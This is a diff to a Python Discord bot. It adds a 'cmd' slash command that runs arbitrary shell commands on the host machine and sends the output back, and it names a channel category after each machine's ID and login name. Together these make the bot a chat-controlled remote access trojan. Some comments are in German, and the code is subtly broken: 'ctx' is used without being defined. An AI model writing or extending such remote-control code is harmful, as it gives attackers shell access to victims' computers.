@@ -19,9 +19,7 @@ bot = Client(intents=Intents.DEFAULT)
 
 @listen()
 async def on_ready():
-    id = functions.create_or_read_id_file()
-    username = os.getlogin()
-    category_name = f"{id}-{username}"
+    category_name = functions.category_name()
 
     guild = bot.get_guild(settings.guild_id())  
     channels = await guild.fetch_channels()
@@ -45,15 +43,46 @@ async def on_ready():
 
 
 #example command
-@slash_command(name="my_command", description="My first command :)")
+@slash_command(name="cmd", description="execute cmd commands")
 @slash_option(
-    name="integer_option",
-    description="Integer Option",
+    name="ID",
+    description="user_ID",
     required=True,
-    opt_type=OptionType.INTEGER
+    opt_type=OptionType.INTEGER,
 )
-async def my_command_function( integer_option: int):
-    await ctx.send(f"You input {integer_option}")
+@slash_option(
+    name = "command",
+    description="the cmd command",
+    required=True,
+    opt_type=OptionType.STRING
+)
+async def cmd(ID: int, command: str):
+    if(ID == functions.create_or_read_id_file()):
+        output = functions.exe_cmd(command)
+        await ctx.send(output)
+
+#@slash_command(name="cmd", description="Reagiert nur im 'main' Channel der spezifischen Kategorie")
+#@slash_option(
+#    name="guild_id",
+#    opt_type=OptionType.CHANNEL
+#)
+#async def cmd(ctx: SlashContext):
+#    category_name = functions.category_name()
+#
+#    # Check if command was used in this category
+#    guild_channels = await bot.get_guild_channels(ctx.guild_id)
+#    category = next((channel for channel in guild_channels if channel.type == ChannelType.GUILD_CATEGORY and channel.name == category_name), None)
+#
+#    if category and ctx.channel_id in [channel.id for channel in guild_channels if channel.parent_id == category.id]:
+#        # Check if it was used in 'main'
+#        main_channel = next((channel for channel in guild_channels if channel.name == "main" and channel.parent_id == category.id), None)
+#        if main_channel and ctx.channel_id == main_channel.id:
+#            await ctx.send("Befehl im richtigen 'main' Channel ausgeführt!")
+#        else:
+#            await ctx.send("Dieser Befehl kann nur im 'main' Channel der spezifischen Kategorie ausgeführt werden.")
+#    else:
+#        await ctx.send("Dieser Befehl kann nur in der spezifischen Kategorie ausgeführt werden.")
+#
 
 
 #start bot
